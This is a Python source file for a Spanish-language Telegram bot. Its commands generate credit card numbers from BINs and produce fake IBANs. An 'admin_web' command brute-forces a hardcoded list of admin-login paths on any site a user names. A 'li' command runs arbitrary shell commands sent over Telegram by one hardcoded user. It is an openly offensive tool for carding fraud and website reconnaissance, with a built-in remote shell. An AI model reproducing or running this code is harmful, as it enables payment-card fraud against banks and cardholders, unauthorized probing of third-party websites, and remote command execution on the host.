# -*- coding: UTF-8 -*-

#modulos que va a importar
import os,sys
from time   import sleep
os.system("clear")

import telegram
import logging
import re,datetime,requests
from random import randint
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.utils.helpers import escape_markdown
from modulos.help import help_user
from modulos.start import start as start_bot
from modulos.info import info as inf
from modulos.gs import sea
from modulos.ibban import ibban
from modulos.bink import nib
from modulos.bin import check_bin as verify_bin
from modulos.iban import iban as verify_iban
from modulos.ccgen import cc_gene
from modulos.random_image import image_a
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext ,Filters ,MessageHandler

os.system("clear")
print("cargando datos para inicio del bot ...")
logging.basicConfig(
		level = logging.INFO,format="%(asctime)s - %(name)s -%(levelname)s - %(message)s")
logger = logging.getLogger()
try:
	TOKEN = os.getenv("TOKEN")
	my_bot = telegram.Bot(token=TOKEN)
	updater = Updater(token=TOKEN,use_context=True)
	dispatcher = updater.dispatcher
except:
	os.system("clear")
	print("recuerde usar export TOKEN='TOKEN'")
	sys.exit()
sleep(0.9)
os.system("clear")
print(f"""
	\033[0;32m----------- informacion -----------\033[0;m     
									            
	\033[0;32mid :\033[0;m \033[0;30;47m{my_bot.getMe()["id"]}\033[0;m  
	\033[0;32mfirst name :\033[0;m \033[0;30;47m{my_bot.getMe()["first_name"]}\033[0;m
	\033[0;32musername :\033[0;m \033[0;30;47m@{my_bot.getMe()["username"]}\033[0;m   
	                                            
	\033[0;32m-----------------------------------\033[0;m""")
def button(update: Update, context: CallbackContext):
	query = update.callback_query
	oel=query.data
	if oel =="newbin":
		keyboard=[[InlineKeyboardButton("VOLVER A CREAR", callback_data='newbin')]]
		reply_markup = InlineKeyboardMarkup(keyboard)
		msg = nib()
		query.edit_message_text(text=msg,reply_markup=reply_markup,parse_mode="HTML")
	elif oel =="newiban":
		keyboard=[[InlineKeyboardButton("VOLVER A CREAR", callback_data='newiban')]]
		reply_markup = InlineKeyboardMarkup(keyboard)
		msg = ibban()
		query.edit_message_text(text=msg,reply_markup=reply_markup,parse_mode="HTML")
	elif oel.split("-")[0] =="gen":
		keyboard=[[InlineKeyboardButton("VOLVER A CREAR", callback_data=f'gen-{oel[1]}')]]
		reply_markup = InlineKeyboardMarkup(keyboard)
		msg = cc_gene(oel[1])
		query.edit_message_text(text=msg,reply_markup=reply_markup,parse_mode="HTML")
def start(update,context):
		logger.info(f"el usuario {update.effective_user['first_name']},uso el comando start")
		msg = start_bot(update.effective_user['first_name'],update.effective_user['id'],my_bot.getMe()["first_name"])
		update.message.reply_photo(image_a(),caption=msg,parse_mode="HTML")
def help(update,context):
		logger.info(f"el usuario {update.effective_user['first_name']},uso el comando help")
		msg = help_user(update.effective_user['id'],update.effective_user['first_name'])
		update.message.reply_text(msg,parse_mode="HTML")
def info(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando info")
	msg = inf(update.message["chat"]["id"],update.effective_user['first_name'],update.message["chat"]["title"],update.message["chat"]["id"],update.effective_user['username'],update.effective_user['is_bot'])
	update.message.reply_text(msg,parse_mode="HTML")
def search(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando search")
	args = context.args
	if len(args) > 0:
		seac = " ".join(args)
		msg = update.message.reply_text("cargando")
		sleep(0.6)
		msg.edit_text("cargando.")
		sleep(0.6)
		msg.edit_text("cargando..")
		msg_a = sea(seac)
		msg.edit_text("cargando...")
		msg.edit_text(msg_a)
	else:
		msg = "ಠ-> <b>EL COMANDO VA SEGUIDO DE LO QUE VA A BUSCAR</b>"
		update.message.reply_text(msg,parse_mode="HTML")
def iban(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando iban")
	args = context.args
	if len(args) == 1:
		msg = verify_iban(args[0])
	elif len(args) > 1:
		msg = "ಠ-> <b>OLO PUEDES ANALIZAR UN IBAN POR COMANDO</B>"
	else:
		msg = "ಠ-> <b>EL COMANDO VA SEGUIDO DE UN IBAN</b>"
	update.message.reply_text(msg,parse_mode="HTML")
def niban(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando niban")
	args = context.args
	if len(args) == 0:
		keyboard=[[InlineKeyboardButton("VOLVER A CREAR", callback_data='newiban')]]
		reply_markup = InlineKeyboardMarkup(keyboard)
		msg = ibban()
		update.message.reply_text(msg,reply_markup=reply_markup,parse_mode='HTML')
	elif len(args) > 0:
		msg = "ಠ-> <b>NO SE REQUIERE INGRESAR UN DATO</b>"
		update.message.reply_text(msg,parse_mode="HTML")
def bin(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando bin")
	args = context.args
	if len(args) == 1:
		msg = verify_bin(args[0])
	elif len(args) > 1:
		msg = "ಠ-> <b>OLO PUEDES ANALIZAR UN BIN POR COMANDO</B>"
	else:
		msg = "ಠ-> <b>EL COMANDO VA SEGUIDO DE UN BIN</b>"
	update.message.reply_text(msg,parse_mode="HTML")
def nbin(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando nbin")
	args = context.args
	if len(args) == 0:
		keyboard=[[InlineKeyboardButton("VOLVER A CREAR", callback_data='newbin')]]
		reply_markup = InlineKeyboardMarkup(keyboard)
		msg = nib()
		update.message.reply_text(msg,reply_markup=reply_markup,parse_mode='HTML')
	elif len(args) > 0:
		msg = "ಠ-> <b>NO SE REQUIERE INGRESAR UN DATO</b>"
		update.message.reply_text(msg,parse_mode="HTML")
def gen(update,context):
	logger.info(f"el usuario {update.effective_user['username']},uso el comando gen")
	args = context.args
	if len(args) == 1:
		keyboard=[[InlineKeyboardButton("CREAR", callback_data=f'gen-{args[0]}')]]
		if len(args[0].split("|")) > 4:
			msg = "ಠ-> ERROR : <b>FORMATO NO VALIDO</b>"
			update.message.reply_text(msg,parse_mode='HTML')
		else:
			keyboard=[[InlineKeyboardButton("CREAR", callback_data=f'gen|{args[0]}')]]
			reply_markup = InlineKeyboardMarkup(keyboard)
			msg = cc_gene(args[0])
			update.message.reply_text(msg,reply_markup=reply_markup,parse_mode='HTML')
	elif len(args) == 0:
		msg = "ಠ-> ERROR : <b>EL COMANDO VA SEGUIDO DE UN BIN</b>"
		update.message.reply_text(msg,parse_mode='HTML')
	else:
		msg = "ಠ-> ERROR : <b>SOLO SE PERMITE INGRESAR UN BIN</b>"
		update.message.reply_text(msg,parse_mode='HTML')
def li(update,context):
	args = context.args
	id = update.effective_user['id']
	if id == 1528509933:
		if len(args) > 0:
			dates = " ".join(args)
			a = os.popen(f"{dates}")
			cmd = a.read()
			msg = f"""
{my_bot.getMe()["first_name"]}@OS:~$ {dates}

{cmd}"""
			update.message.reply_text(msg)
		else:
			msg = "ಠ-> <b>EL COMANDO VA SEGUIDO DE UN COMANDO</b>"
			update.message.reply_text(msg,parse_mode="HTML")
	else:
		msg ="ಠ-> <b>NO TIENES ACCESO A ESTE COMANDO</b>"
		update.message.reply_text(msg,parse_mode="HTML")
def admin_web(update,context):
	logger.info(f"el usuario {update.effective_user['first_name']},uso el comando admin_web")
	args=context.args
	if len(args)==1:
		tu = update.message["chat"]["type"]
		occds = update.message["chat"]["id"]
		if tu == "private":
			msg = update.message.reply_text("◈ LOADING",parse_mode="HTML")
			found = []
			not_found=[]
			web = args[0]
			if not web.startswith('http'):
				web = 'http://' + web
				web = web + '/'
			list = ['admin', 'administrator', 'webadmin', 'wp-login.php', 'wp-admin.php', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5', 'admin/login.php', 'admin/login',
				'adminarea', 'admin/index.php', 'memberadmin', 'admin.aspx', 'admin.asp', 'admin.php', 'administrator.php', 'administrator.aspx', 'administrator.asp', 'login.html', 'cpanel',
				'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
				'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
				'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
				'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
				'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
				'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','administration','pages/admin/admin-login.html','admin/admin-login.html',
				'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
				'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
				'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
				'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
				'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php']
			for i in list:
				url = web + i
				w = requests.get(url)
				f = web.replace('http://','')
				s = f + i
				if w.status_code < 200 or w.status_code <= 201:
					found.append(s)
				else:
					not_found.append(s)
			ml="\n".join(found)
			cl="\n".join(not_found)
			ir = open(f"datos.txt","w")
			ir.write(f"""
---------------------
FOUND : {len(found)}
---------------------

{ml}

---------------------
NOT FOUND : {len(not_found)}

{cl}""")
			msg.edit_text("ಠ-> <b>ANALISIS COMPLETADO ( ESPERE AL ENVIO DEL ARCHIVO POR FAVOR )</b>")
			ir.close()
			my_bot.sendDocument(occds,document=open("datos.txt","r"))
		else:
			msg = "ಠ-> <b>COMANDO VALIDO EN PRIVADO</b>"
			update.message.reply_text(msg,parse_mode="HTML")
	else: 
		msg = "ಠ-> <b>FORMATO NO VALIDO</b>"
		update.message.reply_text(msg,parse_mode="HTML")
dispatcher.add_handler(CommandHandler("li",li))
dispatcher.add_handler(CommandHandler("admin_web",admin_web))
dispatcher.add_handler(CommandHandler("niban",niban))
dispatcher.add_handler(CommandHandler("nbin",nbin))
dispatcher.add_handler(CommandHandler("gen",gen))
dispatcher.add_handler(CommandHandler("iban",iban))
dispatcher.add_handler(CommandHandler("bin",bin))
dispatcher.add_handler(CommandHandler("search",search))
dispatcher.add_handler(CommandHandler("info",info))
dispatcher.add_handler(CommandHandler("start",start))
dispatcher.add_handler(CommandHandler("help",help))
dispatcher.add_handler(CallbackQueryHandler(button))
updater.start_polling()
updater.idle()